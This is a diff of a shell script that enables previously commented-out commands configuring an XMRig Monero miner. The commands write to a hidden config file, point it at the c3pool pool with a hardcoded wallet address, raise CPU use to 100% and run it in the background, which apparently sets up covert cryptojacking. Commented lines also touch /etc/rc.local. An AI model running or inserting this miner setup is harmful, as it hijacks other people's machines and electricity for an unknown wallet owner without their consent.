@@ -68,17 +68,17 @@ fi
 
 
 echo $PORT $PASS 
-# sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.c.three.cfg.json
-# sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.c.three.cfg.json
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.c.three.cfg.json
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.c.three.cfg.json
 
-# sed -i 's/"url": *"[^"]*",/"url": "mine.c3pool.com:'$PORT'",/' $HOME/.c.three.cfg.json
-# sed -i 's/"user": *"[^"]*",/"user": "89QL3jnAwWgFkyi1ZDaKmMGv7KnKt1CDiaB7m1aJ3vS2Vpx98HBY87YBEhziQSDVK1jhtwvRcdBtr8CYMz7ES1xN7CYgYSH",/' $HOME/.c.three.cfg.json
-# sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.c.three.cfg.json
-# sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.c.three.cfg.json
-# sed -i 's#"log-file": *null,#"log-file": "'$HOME/c3pool/xmrig.log'",#' $HOME/.c.three.cfg.json
-# sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.c.three.cfg.json
-# sed -i 's/"background": *false,/"background": true,/' $HOME/.c.three.cfg.json
-# # sed -i -e '$acpulimit -e xmrig -l 300 -b' /etc/rc.local     
-# # sed -i -e '$i sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 75,/' $HOME/.c.three.cfg.json     
-# sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 75,/' $HOME/.c.three.cfg.json
+sed -i 's/"url": *"[^"]*",/"url": "mine.c3pool.com:'$PORT'",/' $HOME/.c.three.cfg.json
+sed -i 's/"user": *"[^"]*",/"user": "89QL3jnAwWgFkyi1ZDaKmMGv7KnKt1CDiaB7m1aJ3vS2Vpx98HBY87YBEhziQSDVK1jhtwvRcdBtr8CYMz7ES1xN7CYgYSH",/' $HOME/.c.three.cfg.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.c.three.cfg.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.c.three.cfg.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/c3pool/xmrig.log'",#' $HOME/.c.three.cfg.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.c.three.cfg.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/.c.three.cfg.json
+# sed -i -e '$acpulimit -e xmrig -l 300 -b' /etc/rc.local     
+# sed -i -e '$i sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 75,/' $HOME/.c.three.cfg.json     
+sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 75,/' $HOME/.c.three.cfg.json
 
